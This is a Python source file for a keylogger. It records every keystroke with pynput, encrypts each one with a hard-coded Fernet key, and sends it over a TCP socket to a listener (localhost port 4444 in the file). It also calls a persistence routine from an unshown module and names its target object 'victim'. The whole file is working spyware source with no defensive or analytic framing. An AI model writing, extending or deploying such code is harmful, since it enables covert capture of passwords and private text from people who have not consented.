from pynput.keyboard import Listener
import socket
import manipulate
from cryptography.fernet import Fernet


class Keylogger():

	def __init__(self, Host, Port):

		self.__Host = Host
		self.__Port = Port
		self.__key_to_discard = [

			"Key.esc", "Key.ctrl", "Key.alt",
			"Key.shift", "Key.caps_lock", "Key.backspace",
			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l"
			"Key.cmdr", "Key.cmd"

		]
		self.client = None
		self.client_connect = False


	def connect_server(self):

		try:
				
			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			Address = (self.__Host, self.__Port)
			self.client.connect(Address)
			print(f"Connected to {self.__Host}:{self.__Port}")
			self.client_connect = True
		
		except Exception as e:

			print(f"Could not connect to Server, due to {e}")

	def persistance(self):

		manipulate.path_manipulation()
	
		
	def write_to_file(self, key):

		keystroke = str(key)
		keystroke = keystroke.replace("'",'')

		if keystroke =="Key.space":
			keystroke = " "
		elif keystroke == "Key.enter":
			keystroke = "\n"
		elif keystroke in self.__key_to_discard:
			keystroke = ""
		if keystroke:

			# byte_msg = keystroke.encode('utf-8')
			byte_msg = crypt.encrypt(keystroke.encode())
			if self.client_connect:

				self.client.sendall(byte_msg)


if __name__ == '__main__':
	
	Host = "localhost"
	Port = 4444
	victim = Keylogger(Host, Port)

   # load the key
	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
	crypt = Fernet(KEY)


	victim.persistance()
	victim.connect_server()

	try:

			with Listener(on_press=victim.write_to_file) as l:

				l.join()

	except KeyboardInterrupt:
			
				l.stop()
				print("We are done here")
	


